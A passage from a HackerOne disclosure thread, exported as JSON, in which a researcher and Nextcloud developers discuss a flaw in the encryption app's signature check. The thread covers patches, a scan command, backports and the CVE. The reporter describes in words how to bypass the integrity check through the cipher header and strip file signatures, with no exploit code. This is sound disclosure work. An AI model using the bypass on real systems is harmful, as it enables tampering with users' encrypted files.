encrypted content files should have a signature.","markdown_message":"\u003cp\u003eI don\u0026#39;t think that the current version fixes the problem. The current version only seems to prevent that the encrypted private key is not downgraded to a legacy cipher (which is actually a finding of its own, so, well done).\u003c/p\u003e\n\n\u003cp\u003eThe problem I\u0026#39;ve found lies in \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2F6cd654a6ced0219b3c7c9c300142ba2557f8559f%2Fapps%2Fencryption%2Flib%2FCrypto%2FCrypt.php%23L584\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehere\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. You can circumvent the integrity check if you set the cipher header to something that doesn\u0026#39;t contain \u003ccode\u003e\u0026#39;ctr\u0026#39;\u003c/code\u003e. That\u0026#39;s a circumvention that should not be allowed. This is where you can open up a known-plaintext attack be stripping the signature from the encrypted file. When the legacy support is disabled then all encrypted content files should have a signature.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T12:32:35.993Z","updated_at":"2020-08-12T12:32:35.993Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8915895,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"mmm it seems my git reset was a little to agressive. Let me find the commit and push it as well :)","markdown_message":"\u003cp\u003emmm it seems my git reset was a little to agressive. Let me find the commit and push it as well :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T12:37:36.284Z","updated_at":"2020-08-12T12:37:36.284Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8916013,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ha, ok so I stashed it on the wrong branch. See an extra pair of eyes always help.\n\nhttps://github.com/nextcloud/server/pull/22218/files#diff-56fd784c4d1bf734318f96878830c3edR584\n\nI think that does the trick. Basically we throw an exception if there is no signature found and legacy mode is not enabled.\n\nWhy I think the first part of the patch also already works is that if you strip the header it will fail in https://github.com/nextcloud/server/blob/fc1596fada4591c8c87306241fbcf0e2c0229d7d/apps/encryption/lib/Crypto/Encryption.php#L235 as there is no header then.\n\nHowever. I think it is better to be on the save side here and have both checks.","markdown_message":"\u003cp\u003eHa, ok so I stashed it on the wrong branch. See an extra pair of eyes always help.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/nextcloud/server/pull/22218/files#diff-56fd784c4d1bf734318f96878830c3edR584\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F22218%2Ffiles%23diff-56fd784c4d1bf734318f96878830c3edR584\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/22218/files#diff-56fd784c4d1bf734318f96878830c3edR584\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI think that does the trick. Basically we throw an exception if there is no signature found and legacy mode is not enabled.\u003c/p\u003e\n\n\u003cp\u003eWhy I think the first part of the patch also already works is that if you strip the header it will fail in \u003ca title=\"https://github.com/nextcloud/server/blob/fc1596fada4591c8c87306241fbcf0e2c0229d7d/apps/encryption/lib/Crypto/Encryption.php#L235\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2Ffc1596fada4591c8c87306241fbcf0e2c0229d7d%2Fapps%2Fencryption%2Flib%2FCrypto%2FEncryption.php%23L235\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/blob/fc1596fada4591c8c87306241fbcf0e2c0229d7d/apps/encryption/lib/Crypto/Encryption.php#L235\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as there is no header then.\u003c/p\u003e\n\n\u003cp\u003eHowever. I think it is better to be on the save side here and have both checks.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T12:54:47.447Z","updated_at":"2020-08-12T12:54:47.447Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8916315,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, that way the admin can decide to choose a different cipher which is not much of a problem as long as the signature is still there and valid.","markdown_message":"\u003cp\u003eYes, that way the admin can decide to choose a different cipher which is not much of a problem as long as the signature is still there and valid.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T13:33:50.423Z","updated_at":"2020-08-12T13:34:08.426Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8916481,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Perfect. Thanks for also checking.\n\nWe are now in process of trying to write the occ command to check for any files with old signatures since my guess is that a lot of users can safely remove the compatibility.","markdown_message":"\u003cp\u003ePerfect. Thanks for also checking.\u003c/p\u003e\n\n\u003cp\u003eWe are now in process of trying to write the occ command to check for any files with old signatures since my guess is that a lot of users can safely remove the compatibility.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-12T13:59:14.303Z","updated_at":"2020-08-12T13:59:14.303Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8924622,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"HI,\n\nSo the scan command is also coming along OK.What we'll do is the go over all files (there is a slight issue here that if you use external storage and don't store the credentials perminatly we can't check but so be it).\n\nAnd then we check all encrypted files for the header. This can also take quite a long time. But I think it should be OK.\nI'll try to get you a PR. Would you be in a situation to test it as well?\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHI,\u003c/p\u003e\n\n\u003cp\u003eSo the scan command is also coming along OK.What we\u0026#39;ll do is the go over all files (there is a slight issue here that if you use external storage and don\u0026#39;t store the credentials perminatly we can\u0026#39;t check but so be it).\u003c/p\u003e\n\n\u003cp\u003eAnd then we check all encrypted files for the header. This can also take quite a long time. But I think it should be OK.\u003cbr\u003e\nI\u0026#39;ll try to get you a PR. Would you be in a situation to test it as well?\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-13T10:46:37.074Z","updated_at":"2020-08-13T10:46:37.074Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8924828,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"From my experience with my *decrypt-all-files* rescue script and from feedback of its users, iterating over all files isn't as bad as one might expect. So I'm looking forward to this solution.\n\nThe rest of the week I'm a bit short on time as I'm attending an IT lawyers' conference today and tomorrow. But after that I'd be able to test the script.","markdown_message":"\u003cp\u003eFrom my experience with my \u003cem\u003edecrypt-all-files\u003c/em\u003e rescue script and from feedback of its users, iterating over all files isn\u0026#39;t as bad as one might expect. So I\u0026#39;m looking forward to this solution.\u003c/p\u003e\n\n\u003cp\u003eThe rest of the week I\u0026#39;m a bit short on time as I\u0026#39;m attending an IT lawyers\u0026#39; conference today and tomorrow. But after that I\u0026#39;d be able to test the script.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-13T11:06:03.704Z","updated_at":"2020-08-13T11:07:55.111Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8971601,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nOk so I think we have the command. Could you try: https://github.com/nextcloud/server/pull/22218\n\nI tested it and on my own system it is more than fast enough indeed. I'll check a larger system with big external storages later.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eOk so I think we have the command. Could you try: \u003ca title=\"https://github.com/nextcloud/server/pull/22218\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F22218\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/22218\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI tested it and on my own system it is more than fast enough indeed. I\u0026#39;ll check a larger system with big external storages later.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-18T18:12:01.603Z","updated_at":"2020-08-18T18:12:01.603Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8981632,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nSo. The PR got into master (of which we have beta1 tomorrow).\nI'm checking to see if I can cleanly backport it to 19 at least.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eSo. The PR got into master (of which we have beta1 tomorrow).\u003cbr\u003e\nI\u0026#39;m checking to see if I can cleanly backport it to 19 at least.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-19T18:13:42.419Z","updated_at":"2020-08-19T18:13:42.419Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9019186,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nOk so I'm backporting it to stable19 as well. There the upgrade step will not warn you automatically yet. But you can run the test command and manually set the flag to false (so that the attack is prevented). I'm trying to see if in a followup I can make the migration as smooth as in 20 but since 19.0.2 comes thursday I'm not sure.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eOk so I\u0026#39;m backporting it to stable19 as well. There the upgrade step will not warn you automatically yet. But you can run the test command and manually set the flag to false (so that the attack is prevented). I\u0026#39;m trying to see if in a followup I can make the migration as smooth as in 20 but since 19.0.2 comes thursday I\u0026#39;m not sure.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T08:25:24.847Z","updated_at":"2020-08-24T08:25:24.847Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9021071,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok so 19 will get in.\n","markdown_message":"\u003cp\u003eOk so 19 will get in.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T10:46:04.829Z","updated_at":"2020-08-24T10:46:04.829Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9023402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Unfortunately, I didn't find the time yet to test the script, but I'll have a free spot on wednesday.","markdown_message":"\u003cp\u003eUnfortunately, I didn\u0026#39;t find the time yet to test the script, but I\u0026#39;ll have a free spot on wednesday.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T13:42:57.254Z","updated_at":"2020-08-24T13:42:57.254Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9073339,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I now finally found the time to test the scan tool. I created such a file by using my [strip-signature.php](https://github.com/syseleven/nextcloud-tools/blob/master/debug/strip-signature.php) script. This results in a content file having a header but no *\"signature\"*. Unfortunately, the scan tool still tells me that I can disable the legacy compatibility mode as it only [checks for the existence of the header](https://github.com/nextcloud/server/blob/2bbb848c31516826d2f031c3d305dd8870d7e628/apps/encryption/lib/Command/ScanLegacyFormat.php#L121).\n\nI actually don't know if there ever were legacy files with a header but without a *\"signature\"* and if you have to check for this scenario, but at least Nextcloud supported these files.","markdown_message":"\u003cp\u003eHi, I now finally found the time to test the scan tool. I created such a file by using my \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fsyseleven%2Fnextcloud-tools%2Fblob%2Fmaster%2Fdebug%2Fstrip-signature.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003estrip-signature.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e script. This results in a content file having a header but no \u003cem\u003e\u0026quot;signature\u0026quot;\u003c/em\u003e. Unfortunately, the scan tool still tells me that I can disable the legacy compatibility mode as it only \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fblob%2F2bbb848c31516826d2f031c3d305dd8870d7e628%2Fapps%2Fencryption%2Flib%2FCommand%2FScanLegacyFormat.php%23L121\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003echecks for the existence of the header\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eI actually don\u0026#39;t know if there ever were legacy files with a header but without a \u003cem\u003e\u0026quot;signature\u0026quot;\u003c/em\u003e and if you have to check for this scenario, but at least Nextcloud supported these files.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-29T11:56:02.738Z","updated_at":"2020-08-29T11:56:02.738Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9157350,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nThanks for checking. I don't think there were lagcy files like that.\nBut I'll see if we can verify or harden the check. However as far as I can tell at least since Nextcloud times there were no files like that.\n\nCheers,\n--Roeland","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThanks for checking. I don\u0026#39;t think there were lagcy files like that.\u003cbr\u003e\nBut I\u0026#39;ll see if we can verify or harden the check. However as far as I can tell at least since Nextcloud times there were no files like that.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\n--Roeland\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-08T08:29:57.039Z","updated_at":"2020-09-08T08:29:57.039Z","actor":{"username":"rullzer","cleared":false,"url":"/rullzer","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/086/005/20095c4a0c77c88375f8db5d6ed10f350d98a5a3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9423152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, I've seen that you have announced Nextcloud 20 and have also backported this fix to Nextcloud 17, 18 and 19. Will there be a [security advisory](https://nextcloud.com/security/advisories/) for this issue?","markdown_message":"\u003cp\u003eHi, I\u0026#39;ve seen that you have announced Nextcloud 20 and have also backported this fix to Nextcloud 17, 18 and 19. Will there be a \u003ca href=\"/redirect?url=https%3A%2F%2Fnextcloud.com%2Fsecurity%2Fadvisories%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003esecurity advisory\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for this issue?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-05T16:18:01.517Z","updated_at":"2020-10-05T16:18:01.517Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9429574,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This has been resolved in our latest maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","markdown_message":"\u003cp\u003eThanks a lot for your report again. This has been resolved in our latest maintenance releases and we\u0026#39;re working on the advisories at the moment.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know how you\u0026#39;d like to be credited in our official advisory. We require the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eName / Pseudonym\u003c/li\u003e\n\u003cli\u003eEmail address (optional)\u003c/li\u003e\n\u003cli\u003eWebsite (optional)\u003c/li\u003e\n\u003cli\u003eCompany (optional)\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-10-06T07:33:40.753Z","updated_at":"2020-10-06T07:33:40.753Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"yahe","url":"/yahe"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9429661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@yahe do you still not want bounties?","markdown_message":"\u003cp\u003e\u003ca href=\"/yahe\"\u003e@yahe\u003c/a\u003e do you still not want bounties?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-06T07:46:49.759Z","updated_at":"2020-10-06T07:46:49.759Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9429753,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-06T07:59:40.113Z","updated_at":"2020-10-06T07:59:40.113Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9429764,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://nextcloud.com/security/advisory/?id=NC-SA-2020-039\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8150","markdown_message":"\u003cp\u003e\u003ca title=\"https://nextcloud.com/security/advisory/?id=NC-SA-2020-039\" href=\"/redirect?url=https%3A%2F%2Fnextcloud.com%2Fsecurity%2Fadvisory%2F%3Fid%3DNC-SA-2020-039\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://nextcloud.com/security/advisory/?id=NC-SA-2020-039\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8150\" href=\"/redirect?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2020-8150\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8150\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-06T08:01:04.998Z","updated_at":"2020-10-06T08:01:04.998Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9431772,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"As said, merch would be welcome. :)","markdown_message":"\u003cp\u003eAs said, merch would be welcome. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-06T10:09:06.823Z","updated_at":"2020-10-06T10:09:06.823Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9431879,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Concerning the crediting in the advisory:\n\nName: Kevin \"Kenny\" Niehage\nE-Mail: kenny@syseleven.de\nWebsite: https://www.syseleven.de/\nCompany: SysEleven GmbH","markdown_message":"\u003cp\u003eConcerning the crediting in the advisory:\u003c/p\u003e\n\n\u003cp\u003eName: Kevin \u0026quot;Kenny\u0026quot; Niehage\u003cbr\u003e\nE-Mail: \u003ca title=\"kenny@syseleven.de\" href=\"mailto:kenny@syseleven.de\" rel=\"nofollow noopener noreferrer\"\u003ekenny@syseleven.de\u003c/a\u003e\u003cbr\u003e\nWebsite: \u003ca title=\"https://www.syseleven.de/\" href=\"/redirect?url=https%3A%2F%2Fwww.syseleven.de%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.syseleven.de/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nCompany: SysEleven GmbH\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-06T10:22:13.807Z","updated_at":"2020-10-06T10:22:13.807Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9730297,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-05T07:59:44.758Z","updated_at":"2020-11-05T07:59:44.758Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9730347,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good morning. Do you already know when the CVE and NC-SA will be published?","markdown_message":"\u003cp\u003eGood morning. Do you already know when the CVE and NC-SA will be published?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-05T08:06:55.995Z","updated_at":"2020-11-05T08:06:55.995Z","actor":{"username":"yahe","cleared":false,"url":"/yahe","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/FHoMM5nd5Mw7BuoUY5D7NTdF/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9814703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"SA and CVE published","markdown_message":"\u003cp\u003eSA and CVE published\u003c/p\u003e\n","automated_response":false,"created_at":"2020-11-13T14:41:32.669Z","updated_at":"2020-11-13T14:41:32.669Z","actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}